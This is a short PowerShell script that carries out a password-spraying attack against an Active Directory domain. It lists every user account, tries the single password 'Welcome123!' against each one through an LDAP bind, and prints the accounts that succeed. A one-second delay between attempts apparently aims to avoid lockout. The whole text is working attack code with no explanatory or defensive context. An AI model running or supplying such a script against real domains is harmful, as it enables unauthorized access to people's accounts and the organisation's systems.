$users = ([adsisearcher]"ObjectClass=user").FindAll() | ForEach-Object { $_.Properties['sAMAccountName'][0] }
$p = "Welcome123!"
$d = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name

foreach ($user in $users) {
 $check = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$d", $user, $p)
 if ($check.name -ne $null) {
  Write-Host $user $p
 }
 Start-Sleep -Seconds 1
}
